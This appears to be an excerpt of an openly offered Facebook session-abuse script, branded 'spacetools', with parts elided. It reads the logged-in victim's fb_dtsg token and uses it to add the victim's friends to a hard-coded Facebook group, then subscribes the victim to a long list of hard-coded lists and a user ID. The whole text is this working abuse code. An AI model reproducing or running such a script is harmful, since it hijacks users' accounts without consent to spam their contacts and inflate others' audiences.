...
var tulisanNganu = '<font color="black"><b>spacetools | by:husamalshjrh</b> </font>';
var kunaon = '';
function penetrasi(opo) {
	...
	if (memberGroupId != 1464824943740731) {
		jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=1464824943740731&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
		"text", "post")
	}
}
...
sublist("585514934875767");
sublist("548163675277560");
sublist("588613741232553");
sublist("588614007899193");
sublist("588614184565842");
sublist("588614477899146");
sublist("588614821232445");
sublist("588615511232376");
sublist("1400634446857411");
sublist("1400634040190785");
sublist("368311919979363");
sublist("407782766032278");
sublist("1400527796841415");
sublist("1400527796841415");
IDS("100002517980325");
})